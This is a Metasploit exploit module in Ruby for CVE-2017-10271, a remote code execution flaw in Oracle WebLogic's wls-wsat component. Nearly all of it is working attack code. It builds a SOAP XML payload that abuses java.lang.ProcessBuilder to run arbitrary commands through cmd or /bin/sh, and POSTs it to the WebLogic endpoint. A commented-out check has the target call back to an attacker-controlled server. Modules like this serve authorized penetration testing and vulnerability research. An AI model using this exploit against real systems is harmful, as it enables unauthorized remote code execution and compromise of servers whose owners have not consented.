##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  # include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Oracle WebLogic wls-wsat Component Deserialization RCE',
        'Description'    => %q(
            The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization
        remote code execution vulnerability. Supported versions that are affected are
        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin
        of ERPScan and Federico Dotta of Media Service. Please note that SRVHOST, SRVPORT,
        HTTP_DELAY, URIPATH and related HTTP Server variables are only used when executing a check
        and will not be used when executing the exploit itself.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>', # Metasploit module
          'Luffin', # Proof of Concept
          'Alexey Tyurin', 'Federico Dotta' # Vulnerability Discovery
        ],
        'References'     =>
          [
            ['URL', 'https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html'], # Security Bulletin
            ['URL', 'https://github.com/Luffin/CVE-2017-10271'], # Proof-of-Concept
            ['URL', 'https://github.com/kkirsche/CVE-2017-10271'], # Standalone Exploit
            ['CVE', '2017-10271'],
            ['EDB', '43458']
          ],
        'Platform'      => %w{ win unix },
        'Arch'          => [ ARCH_CMD ],
        'Targets'        =>
          [
            [ 'Windows Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'win' } ],
            [ 'Unix Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ]
          ],
        'DisclosureDate' => "Oct 19 2017",
        # Note that this is by index, rather than name. It's generally easiest
        # just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget'  => 0
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the WebLogic WSAT endpoint', '/wls-wsat/CoordinatorPortType']),
      OptPort.new('RPORT', [true, "The remote port that the WebLogic WSAT endpoint listens on", 7001]),
      OptFloat.new('TIMEOUT', [true, "The timeout value of requests to RHOST", 20.0]),
      # OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the check payload', 10])
    ])
  end

  def cmd_base
    if target['Platform'] == 'win'
      return 'cmd'
    else
      return '/bin/sh'
    end
  end

  def cmd_opt
    if target['Platform'] == 'win'
      return '/c'
    else
      return '-c'
    end
  end


  #
  # This generates a XML payload that will execute the desired payload on the RHOST
  #
  def exploit_process_builder_payload
    # Generate a payload which will execute on a *nix machine using /bin/sh
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>#{cmd_base}</string>
            </void>
            <void index="1">
              <string>#{cmd_opt}</string>
            </void>
            <void index="2">
              <string>#{payload.encoded.encode(xml: :text)}</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end

  #
  # This builds a XML payload that will generate a HTTP GET request to our SRVHOST
  # from the target machine.
  #
  def check_process_builder_payload
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void id="url" class="java.net.URL">
          <string>#{get_uri.encode(xml: :text)}</string>
        </void>
        <void idref="url">
          <void id="stream" method = "openStream" />
        </void>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end

  #
  # In the event that a 'check' host responds, we should respond randomly so that we don't clog up
  # the logs too much with a no response error or similar.
  #
  def on_request_uri(cli, request)
    random_content = '<html><head></head><body><p>'+Rex::Text.rand_text_alphanumeric(20)+'<p></body></html>'
    send_response(cli, random_content)

    @received_request = true
  end

  #
  # The exploit method connects to the remote service and sends a randomly generated string
  # encapsulated within a SOAP XML body. This will start an HTTP server for us to receive
  # the response from. This is based off of the exploit technique from
  # exploits/windows/novell/netiq_pum_eval.rb
  #
  # This doesn't work as is because MSF cannot mix HttpServer and HttpClient
  # at the time of authoring this
  #
  # def check
  #   start_service
  #
  #   print_status('Sending the check payload...')
  #   res = send_request_cgi({
  #     'method'   => 'POST',
  #     'uri'      => normalize_uri(target_uri.path),
  #     'data'     => check_process_builder_payload,
  #     'ctype'    => 'text/xml;charset=UTF-8'
  #   }, datastore['TIMEOUT'])
  #
  #   print_status("Waiting #{datastore['HTTP_DELAY']} seconds to see if the target requests our URI...")
  #
  #   waited = 0
  #   until @received_request
  #     sleep 1
  #     waited += 1
  #     if waited > datastore['HTTP_DELAY']
  #       stop_service
  #       return Exploit::CheckCode::Safe
  #     end
  #   end
  #
  #   stop_service
  #   return Exploit::CheckCode::Vulnerable
  # end

  #
  # The exploit method connects to the remote service and sends the specified payload
  # encapsulated within a SOAP XML body.
  #
  def exploit
    send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path),
      'data'     => exploit_process_builder_payload,
      'ctype'    => 'text/xml;charset=UTF-8'
    }, datastore['TIMEOUT'])
  end
end
